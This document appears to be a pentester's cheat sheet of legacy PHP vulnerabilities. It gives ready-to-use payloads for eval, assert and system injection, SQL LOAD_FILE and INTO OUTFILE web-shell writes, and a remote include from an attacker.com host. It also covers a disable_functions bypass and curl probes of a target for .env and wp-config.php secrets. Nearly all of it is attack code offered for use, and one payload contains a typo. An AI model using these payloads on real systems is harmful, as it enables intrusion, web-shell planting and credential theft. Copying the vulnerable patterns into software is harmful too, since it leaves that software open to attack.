# PHP Legacy Vulnerabilities

## 1. PHP preg_replace /e (PHP < 7.0)
```php
// RCE via /e modifier
preg_replace('/.*/e', $_GET['cmd'], '');
// Payload: ?cmd=system('id')
```

## 2. PHP assert() Injection (PHP < 7.2)
```php
assert($_GET['cmd']);
// Payload: ?cmd=system('id')
assert($_POST['code']);
// Payload: code=system('id')
```

## 3. PHP create_function() Injection
```php
$f = create_function('', $_GET['code']);
// Payload: ?code=return system('id);}//
```

## 4. PHP unserialize() Object Injection
```php
unserialize($_GET['data']);
// POP chain to RCE
```

## 5. PHP extract() Variable Overwrite
```php
extract($_GET);
// Payload: ?_GET=1&GLOBALS=1
// Overwrite any variable
```

## 6. PHP register_globals (PHP < 5.4)
```php
// All GET/POST/COOKIE become variables
// ?authorized=1 bypasses auth
if ($authorized) { show_admin(); }
```

## 7. PHP allow_url_include
```php
// If allow_url_include=On
include($_GET['page']);
// Payload: ?page=http://attacker.com/shell.txt
```

## 8. PHP magic_quotes bypass
```php
// PHP < 5.4
// Bypass with GBK encoding
%bf%27 -> 0xbf27 (valid GBK, escapes ')
```

## 9. PHP Session Fixation
```php
// Fixate session ID
// http://target/?PHPSESSID=attacker_session
session_id($_GET['PHPSESSID']);
session_start();
```

## 10. PHP type juggling
```php
// Magic hash comparison
"0e12345" == "0e99999" // true (both are 0)
// MD5: 0e462097431906509019562988736854
// Payload: password with MD5 starting with 0e
```

## 11. PHP disable_functions bypass
```bash
# LD_PRELOAD
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com","","","");
# PHP-FPM
# Apache + mod_cgi
# ImageMagick
# Bash Shellshock
```

## 12. PHP file_put_contents
```php
file_put_contents($_GET['file'], $_GET['data']);
// Payload: ?file=shell.php&data=<?php system('id');?>
```

## 13. PHP eval() Injection
```php
eval($_GET['code']);
// Payload: ?code=system('id');
```

## 14. PHP system/exec/passthru
```php
system($_GET['cmd']);
exec($_GET['cmd']);
passthru($_GET['cmd']);
shell_exec($_GET['cmd']);
// Payload: ?cmd=id
```

## 15. PHP XXE via SimpleXMLElement
```php
$xml = new SimpleXMLElement($_POST['xml'], LIBXML_NOENT);
```

## 16. PHP File Inclusion via wrappers
```
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain,<?php system('id');?>
expect://id
phar://upload/test.txt
```

## 17. PHP Header Injection
```php
header("Location: " . $_GET['url']);
// CRLF injection
// ?url=/page%0d%0aSet-Cookie:session=attacker
```

## 18. PHP SSRF via cURL
```php
$ch = curl_init($_GET['url']);
curl_exec($ch);
// ?url=http://169.254.169.254/latest/meta-data/
```

## 19. PHP SQL Injection (old mysql_* functions)
```php
$result = mysql_query("SELECT * FROM users WHERE id=" . $_GET['id']);
// Direct injection
```

## 20. PHP XSS via echo
```php
echo $_GET['name'];
echo "<div>" . $_POST['content'] . "</div>";
```

## 21. PHP deserialization via phar://
```php
file_exists("phar://uploads/exploit.phar/test.txt");
// Triggers deserialization of metadata
```

## 22. PHP open_basedir bypass
```bash
# Glob wrapper
php -r "foreach(glob('../*') as $f) echo $f;"
# Realpath cache
# Symlink attack
```

## 23. PHP tempnam() race condition
```php
$file = tempnam('/tmp', 'prefix');
// Race between creation and use
```

## 24. PHP MySQL LOAD_FILE
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

## 25. PHP MySQL INTO OUTFILE
```sql
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

## Detection
```bash
# Check PHP version
curl -sk "http://target/" -I | grep -i "X-Powered-By: PHP"
# Check phpinfo
curl -sk "http://target/phpinfo.php"
curl -sk "http://target/info.php"
# Check common files
curl -sk "http://target/.env"
curl -sk "http://target/config.php"
curl -sk "http://target/wp-config.php"
```
